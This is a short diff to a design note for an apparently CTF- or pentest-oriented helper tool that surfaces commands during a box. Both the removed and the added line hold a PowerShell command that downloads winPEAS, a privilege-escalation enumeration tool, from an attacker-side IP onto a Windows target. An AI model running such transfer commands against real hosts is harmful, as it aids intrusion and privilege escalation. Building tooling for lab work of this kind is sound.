@@ -9,7 +9,7 @@
 Mid-box, the user needs commands that aren't on the current checklist step, and has to dig for them. The example that prompted this design was getting winPEAS onto a Windows host:
 
 ```
-powershell -c "iwr -uri http://172.31.45.212/winPEASx64_ofs.exe -OutFile C:\Windows\Temp\winPEASx64.exe"
+powershell -c "iwr -uri http://10.10.14.7/winPEASx64_ofs.exe -OutFile C:\Windows\Temp\winPEASx64.exe"
 ```
 
 The user went looking for it "under file transfer commands in the attack methodology". This project makes that a few keystrokes, already filled for the host they're on.
